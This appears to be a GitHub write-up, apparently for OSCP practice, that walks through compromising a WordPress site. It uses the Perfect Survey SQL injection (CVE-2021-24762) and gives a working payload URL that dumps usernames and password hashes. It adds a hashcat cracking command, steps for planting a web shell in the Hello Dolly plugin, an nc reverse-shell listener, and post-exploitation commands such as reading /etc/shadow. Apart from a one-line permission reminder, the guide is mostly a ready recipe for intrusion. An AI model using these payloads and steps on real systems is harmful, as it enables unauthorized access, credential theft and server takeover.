
# Uploading a Shell in WordPress via SQLi Entry Point 

This guide walks through the process of exploiting a SQL Injection (SQLi) vulnerability in a WordPress site to upload a shell and gain access to the server.

## Target Information

The target is a WordPress website. After extensive enumeration and testing of various parameters (e.g., ID, p, search), no vulnerabilities were initially found. 

## Discovery of Vulnerability

Using WPScan, I identified a critical CVE 
Perfect Survey < 1.5.2 - Unauthenticated SQL Injection:
- **CVE-2021-24762**: [Link to CVE](https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad)
  ![image](https://github.com/MalekAlthubiany/WordPressShell-OSCP/assets/127455300/9e15ccec-8f79-4123-a9d2-d73787e04c6f)

### Exploit Payload

The payload used for exploiting this vulnerability is:

```
https://example.com/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users
```
![image](https://github.com/MalekAlthubiany/WordPressShell-OSCP/assets/127455300/d741d6f2-efee-4a56-aeaf-2e3d8ca8b7ee)

The `question_id` must start with an existing post ID. Upon executing this payload, user credentials were leaked, including hashed passwords.

## Cracking the Hash

Using Hashcat, the hash was cracked:

```sh
hashcat -m 400 -a 0 'hash'
```

The password was immediately revealed. Using the cracked credentials, I logged into the WordPress admin panel.

## Uploading a Web Shell

1. **Login to WordPress Admin Panel**:
   - Username: `admin`
   - Password: `crackedhash`

2. **Editing a Plugin**:
   - Navigate to the Plugins section.
   - Choose the "Hello Dolly" plugin 
   - Edit the plugin file (e.g., `hello.php`) to include a web shell code.
   - Update the plugin with the modified code.

3. **Starting a Listener**:
   - Start a listener on your machine to catch the reverse shell:
   
   ```sh
   nc -lnvp 1234
   ```

4. **Activating the Shell**:
   - Visit `https://target.com/wp-content/plugins/hello.php` to activate the shell and gain access to the server.

## Post-Exploitation

After gaining shell access, check your privileges and enumerate the system for sensitive files and data. Due to privilege restrictions, enumeration might be limited.

### Simple Commands for Enumeration

Use simple commands to explore and gather information from the server:

```sh
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
```

### Finding .txt Files

Use the following command to find all `.txt` files in the `/var/www` directory:

```sh
find /var/www -type f -name "*.txt"
```
![image](https://github.com/MalekAlthubiany/WordPressShell-OSCP/assets/127455300/4a7875cd-071b-4ce0-a6c3-097c0fd20e09)

The results from this command include:

```
/var/www/wordpress/wp-includes/js/swfupload/license.txt
/var/www/wordpress/wp-includes/js/plupload/license.txt
/var/www/wordpress/wp-includes/images/crystal/license.txt
/var/www/wordpress/wp-includes/ID3/readme.txt
/var/www/wordpress/wp-includes/ID3/license.txt
/var/www/wordpress/wp-includes/ID3/license.commercial.txt
/var/www/wordpress/license.txt
/var/www/wordpress/wp-content/themes/oceanwp/readme.txt
/var/www/wordpress/wp-content/themes/oceanwp/inc/customizer/assets/js/customize-search.js.LICENSE.txt
/var/www/wordpress/wp-content/themes/twentytwentytwo/readme.txt
/var/www/wordpress/wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/LICENSE.txt
/var/www/wordpress/wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/LICENSE.txt
/var/www/wordpress/wp-content/themes/twentytwentytwo/assets/fonts/inter/LICENSE.txt
/var/www/wordpress/wp-content/plugins/wpforms-lite/readme.txt
/var/www/wordpress/wp-content/plugins/wpforms-lite/changelog.txt
/var/www/wordpress/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/license.txt
/var/www/wordpress/wp-content/plugins/ocean-stick-anything/readme.txt
/var/www/wordpress/wp-content/plugins/akismet/readme.txt
/var/www/wordpress/wp-content/plugins/akismet/changelog.txt
/var/www/wordpress/wp-content/plugins/akismet/LICENSE.txt
/var/www/wordpress/wp-content/plugins/ocean-social-sharing/readme.txt
/var/www/wordpress/wp-content/plugins/elementor/readme.txt
/var/www/wordpress/wp-content/plugins/elementor/license.txt
/var/www/wordpress/wp-content/plugins/elementor/assets/js/app.min.js.LICENSE.txt
/var/www/wordpress/wp-content/plugins/ocean-extra/readme.txt
/var/www/wordpress/wp-content/plugins/ocean-extra/includes/freemius/includes/sdk/LICENSE.txt
/var/www/wordpress/wp-content/plugins/ocean-extra/includes/freemius/LICENSE.txt
/var/www/wordpress/wp-content/plugins/ocean-extra/changelog.txt
/var/www/wordpress/wp-content/plugins/perfect-survey/readme.txt
```

## Conclusion

This process demonstrates how to leverage a known vulnerability in a WordPress site to gain unauthorized access and upload a shell. Always ensure you have permission to test and exploit vulnerabilities on any target system.

